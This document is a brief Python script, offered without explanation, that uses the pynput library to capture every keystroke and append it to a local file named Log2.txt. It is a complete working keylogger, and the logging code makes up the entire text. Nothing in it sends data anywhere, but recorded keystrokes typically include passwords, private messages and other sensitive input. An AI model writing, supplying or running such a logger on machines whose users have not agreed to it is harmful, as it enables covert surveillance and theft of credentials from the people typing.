from pynput.keyboard import Listener

def WriteToFile(key):
    keydata=str(key)
    with open("Log2.txt",'a+') as f:
        f.write(keydata)

with Listener(on_press=WriteToFile) as f:
    f.join()

